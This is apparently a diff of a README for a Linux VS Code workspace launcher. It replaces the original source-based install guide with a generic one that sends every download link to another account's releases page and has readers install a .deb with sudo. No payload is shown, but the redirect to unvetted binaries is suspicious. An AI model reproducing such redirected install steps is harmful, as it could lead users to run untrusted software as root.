@@ -1,222 +1,84 @@
-# VS Code Project Launcher
+# 🚀 vscode-project-launcher - Easily Manage Your VS Code Workspaces
 
-<div align="center">
+## 📦 Download Now
+[![Download](https://img.shields.io/badge/Download-vscode--project--launcher-brightgreen)](https://github.com/yogas13/vscode-project-launcher/releases)
 
-![VS Code Project Launcher](https://img.shields.io/badge/VS%20Code-Project%20Launcher-007ACC?style=for-the-badge&logo=visual-studio-code)
-![Python](https://img.shields.io/badge/Python-3.7+-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
-![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
+## 💻 Introduction
+vscode-project-launcher is a desktop application designed to help you manage and launch your Visual Studio Code workspaces with ease. No programming knowledge is required. If you frequently switch between projects, this app can make your workflow smoother.
 
-A desktop application to easily manage and launch VS Code workspaces from a centralized interface.
+## 🚀 Getting Started
+To get started with vscode-project-launcher, follow these simple steps:
 
-[Installation](#installation) •
-[Features](#features) •
-[Usage](#usage) •
-[Contributing](#contributing)
+### 1. System Requirements
+- Operating System: Linux
+- Python: Version 3.x
+- Free disk space: At least 100 MB
 
-</div>
+### 2. Downloading the Application
+Visit the Releases page to download the application. You can find it here:
 
-## 🚀 Features
+[Download & Install](https://github.com/yogas13/vscode-project-launcher/releases)
 
-- **Workspace Discovery**: Automatically scans your development directories for `.code-workspace` files
-- **Quick Launch**: Double-click to open workspaces in VS Code
-- **Search & Filter**: Find workspaces quickly by name or path
-- **Favorites**: Mark frequently used workspaces as favorites
-- **Recent Workspaces**: Keep track of recently opened workspaces
-- **Desktop Integration**: Install as a desktop application on Linux
-- **Configurable**: Set custom scan directories and preferences
+### 3. Installing the Application
+- Locate the downloaded file on your computer.
+- Open a terminal window.
+- Navigate to the folder where you downloaded the file.
+- Enter the following command to install the application:
+  ```
+  sudo dpkg -i vscode-project-launcher.deb
+  ```
+- If you face dependency issues, run:
+  ```
+  sudo apt-get install -f
+  ```
 
-## 📸 Screenshots
+### 4. Launching vscode-project-launcher
+Once the installation is complete, you can launch the application from your application menu. Find “vscode-project-launcher” and click to open it.
 
-![Main Window](https://via.placeholder.com/600x400?text=Main+Window+Screenshot)
-*Main application window showing workspace list with search and favorites*
+## 🌟 Features
+- **Manage Workspaces:** Easily add or remove workspaces.
+- **Launch Projects Quickly:** No need to search for project folders; they are all in one place.
+- **User-Friendly Interface:** The graphical interface is simple and easy to navigate.
 
-![Settings Dialog](https://via.placeholder.com/400x300?text=Settings+Dialog)
-*Configuration dialog for scan directories and preferences*
+## 🛠️ Using vscode-project-launcher
+### 1. Adding Workspaces
+To add a new workspace:
+- Click on the “Add Workspace” button.
+- Navigate to the folder containing your VS Code project.
+- Select the folder and click “Open.”
 
-## 🛠 Installation
+### 2. Launching a Workspace
+To launch a workspace:
+- Select the workspace you want to open from the list.
+- Click the “Launch” button. Your project will open in VS Code.
 
-### Prerequisites
+## 📜 Troubleshooting
+If you encounter issues:
+- Ensure you have Python 3 installed.
+- Make sure you have the required dependencies.
+- Check your internet connection while downloading.
 
-- Python 3.7+
-- VS Code installed and accessible via `code` command
-- Linux desktop environment (tested on Fedora, Ubuntu, etc.)
+## 📞 Support and Feedback
+If you need help, feel free to open an issue on the GitHub repository or reach out to our support team. Your feedback is important for further improving vscode-project-launcher.
 
-### Quick Setup
+## 🔗 Useful Links
+- [Release Page](https://github.com/yogas13/vscode-project-launcher/releases)
+- [GitHub Repository](https://github.com/yogas13/vscode-project-launcher)
 
-```bash
-# Clone the repository
-git clone https://github.com/Zajfan/vscode-project-launcher.git
-cd vscode-project-launcher
+## 🏷️ Topics
+- linux
+- linux-app
+- python
+- python-3
+- python3
+- tkinter
+- tkinter-graphic-interface
+- tkinter-gui
+- tkinter-python
+- vscode
+- workspace
+- workspace-management
+- workspace-manager
+- workspaces
 
-# Run the setup script
-./setup_launcher.sh
-
-# Launch the application
-./launch.sh
-```
-
-### Manual Installation
-
-```bash
-# Install system dependencies (Fedora/RHEL)
-sudo dnf install python3-tkinter
-
-# Install Python dependencies
-pip3 install --user -r requirements.txt
-
-# Make scripts executable
-chmod +x launch.sh cli.py src/install_desktop.py
-```
-
-### Desktop Integration
-
-```bash
-# Install desktop shortcut and menu entry
-python3 src/install_desktop.py --desktop-shortcut
-
-# System-wide installation (requires sudo)
-sudo python3 src/install_desktop.py --system --desktop-shortcut
-```
-
-## 📚 Usage
-
-### GUI Mode (Recommended)
-
-Launch the graphical interface:
-```bash
-./launch.sh
-```
-
-### Command Line Interface
-
-```bash
-# List all workspaces
-./cli.py list
-
-# Search for workspaces
-./cli.py search "project name"
-
-# Launch a workspace by index
-./cli.py launch 1
-
-# Launch a specific workspace file
-./cli.py launch ~/path/to/workspace.code-workspace
-
-# Show favorites and recent workspaces
-./cli.py favorites
-./cli.py recent
-```
-
-### Keyboard Shortcuts
-
-- `Ctrl+R` or `F5`: Refresh workspace list
-- `Ctrl+F`: Focus search box
-- `Ctrl+O` or `Enter`: Open selected workspace
-- `Ctrl+N`: Open workspace in new window
-- `Escape`: Clear search
-
-## 🏗 Project Structure
-```
-src/
-├── main.py              # Application entry point
-├── gui/                 # GUI components
-│   ├── __init__.py
-│   ├── main_window.py   # Main application window
-│   ├── settings_dialog.py # Settings configuration
-│   └── workspace_item.py # Workspace list item widget
-├── core/                # Core functionality
-│   ├── __init__.py
-│   ├── workspace_scanner.py # Workspace file discovery
-│   ├── config_manager.py    # Configuration management
-│   └── launcher.py          # VS Code launching logic
-└── utils/               # Utility functions
-    ├── __init__.py
-    └── file_utils.py    # File system utilities
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Here's how you can help:
-
-1. **Fork** the repository
-2. **Create** a feature branch (`git checkout -b feature/amazing-feature`)
-3. **Commit** your changes (`git commit -m 'Add amazing feature'`)
-4. **Push** to the branch (`git push origin feature/amazing-feature`)
-5. **Open** a Pull Request
-
-### Development Setup
-
-```bash
-# Clone your fork
-git clone https://github.com/yourusername/vscode-project-launcher.git
-cd vscode-project-launcher
-
-# Create virtual environment (optional)
-python3 -m venv venv
-source venv/bin/activate
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Run the application
-./launch.sh
-```
-
-### Areas for Contribution
-
-- 🐛 **Bug Reports**: Found a bug? Please open an issue
-- 💡 **Feature Requests**: Have an idea? Let's discuss it
-- 📖 **Documentation**: Help improve the docs
-- 🧪 **Testing**: Add unit tests and integration tests
-- 🎨 **UI/UX**: Improve the interface design
-- 🚀 **Performance**: Optimize scanning and launching
-
-## 🐛 Troubleshooting
-
-### Common Issues
-
-**VS Code not found**
-```bash
-# Install the 'code' command in VS Code
-# Ctrl+Shift+P → "Shell Command: Install 'code' command in PATH"
-```
-
-**Permission errors when scanning**
-```bash
-# Check directory permissions
-ls -la /path/to/directory
-```
-
-**Missing tkinter**
-```bash
-# Fedora/RHEL/CentOS
-sudo dnf install python3-tkinter
-
-# Ubuntu/Debian
-sudo apt install python3-tk
-```
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- VS Code team for creating an amazing editor
-- Python tkinter community for GUI framework
-- All contributors who help improve this project
-
-## ⭐ Support
-
-If you found this project helpful, please consider:
-- ⭐ **Starring** the repository
-- 🐛 **Reporting** bugs and issues
-- 💡 **Suggesting** new features
-- 🤝 **Contributing** code or documentation
-
----
-
-<div align="center">
-Made with ❤️ for the VS Code community
-</div>
+Thank you for choosing vscode-project-launcher! Enjoy managing your VS Code workspaces effortlessly.
